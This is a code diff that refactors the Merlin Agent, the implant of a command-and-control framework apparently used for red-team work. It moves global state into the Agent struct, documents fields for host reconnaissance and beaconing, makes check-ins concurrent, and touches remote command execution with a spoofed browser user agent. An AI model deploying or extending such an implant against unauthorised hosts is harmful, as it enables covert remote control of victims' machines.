@@ -51,38 +51,35 @@ import (
 )
 
 // GLOBAL VARIABLES
-var mRun = true
-//var h2Client = getHQWebClient() //TODO move this to init()?
-var agentShell = ""
-var build = "nonRelease"
-var initial = false
+var build = "nonRelease" // build is the build number of the Merlin Agent program set at compile time
 
 //TODO this is a duplicate with agents/agents.go, centralize
 
 // Agent is a structure for agent objects. It is not exported to force the use of the New() function
 type Agent struct {
-	ID            uuid.UUID
-	Platform      string
-	Architecture  string
-	UserName      string
-	UserGUID      string
-	HostName      string
-	Ips           []string
-	Pid           int
-	iCheckIn      time.Time
-	sCheckIn      time.Time
-	Version       string
-	Build         string
-	WaitTime      time.Duration
-	PaddingMax    int
-	MaxRetry      int
-	FailedCheckin int
-	Skew		  int64
-	Verbose		  bool
-	Debug 		  bool
-	Proto 		  string
-	Client 		  *http.Client
-	UserAgent	  string
+	ID            uuid.UUID // ID is a Universally Unique Identifier per agent
+	Platform      string // Platform is the operating system platform the agent is running on (i.e. windows)
+	Architecture  string // Architecture is the operating system architecture the agent is running on (i.e. amd64)
+	UserName      string // UserName is the username that the agent is running as
+	UserGUID      string // UserGUID is a Globally Unique Identifier associated with username
+	HostName      string // HostName is the computer's host name
+	Ips           []string // Ips is a slice of all the IP addresses assigned to the host's interfaces
+	Pid           int // Pid is the Process ID that the agent is running under
+	iCheckIn      time.Time // iCheckIn is a timestamp of the agent's initial check in time
+	sCheckIn      time.Time // sCheckIn is a timestamp of the agent's last status check in time
+	Version       string // Version is the version number of the Merlin Agent program
+	Build         string // Build is the build number of the Merlin Agent program
+	WaitTime      time.Duration // WaitTime is how much time the agent waits in-between checking in
+	PaddingMax    int // PaddingMax is the maximum size allowed for a randomly selected message padding length
+	MaxRetry      int // MaxRetry is the maximum amount of failed check in attempts before the agent quits
+	FailedCheckin int // FailedCheckin is a count of the total number of failed check ins
+	Skew		  int64 // Skew is size of skew added to each WaitTime to vary check in attempts
+	Verbose		  bool // Verbose enables verbose messages to standard out
+	Debug 		  bool // Debug enables debug messages to standard out
+	Proto 		  string // Proto contains the transportation protocol the agent is using (i.e. h2 or hq)
+	Client 		  *http.Client // Client is an http.Client object used to make HTTP connections for agent communications
+	UserAgent	  string // UserAgent is the user agent string used with HTTP connections
+	initial		  bool // initial identifies if the agent has successfully completed the first initial check in
 }
 
 // New creates a new agent struct with specific values and returns the object
@@ -102,6 +99,7 @@ func New(protocol string, verbose bool, debug bool) Agent {
 		Debug: debug,
 		Proto: protocol,
 		UserAgent: "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36",
+		initial: false,
 	}
 
 	u, errU := user.Current()
@@ -175,14 +173,14 @@ func (a *Agent) Run(server string) {
 		message("note", fmt.Sprintf("Agent build: %s", build))
 	}
 
-	for mRun {
-		if initial {
+	for {
+		if a.initial {
 			if a.Verbose {
 				message("note","Checking in")
 			}
-			a.statusCheckIn(server, a.Client)
+			go a.statusCheckIn(server, a.Client)
 		} else {
-			initial = a.initialCheckIn(server, a.Client)
+			a.initial = a.initialCheckIn(server, a.Client)
 		}
 		if a.FailedCheckin >= a.MaxRetry {
 			if a.Debug{message("debug", "Failed Checkin is greater than or equal to max retries. Quitting")}
@@ -595,7 +593,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 				if a.Verbose {
 					message("note", "Received agent re-initialize message")
 				}
-				initial = false
+				a.initial = false
 			case "maxretry":
 
 				t, err := strconv.Atoi(p.Args)
@@ -657,7 +655,7 @@ func (a *Agent) executeCommand(j messages.CmdPayload) (stdout string, stderr str
 		message("debug", fmt.Sprintf("Received input parameter for executeCommand function: %s", j))
 
 	} else if a.Verbose {
-		message("success", fmt.Sprintf("Executing command %s %s %s", agentShell, j.Command, j.Args))
+		message("success", fmt.Sprintf("Executing command %s %s", j.Command, j.Args))
 	}
 
 	stdout, stderr = ExecuteCommand(j.Command, j.Args)
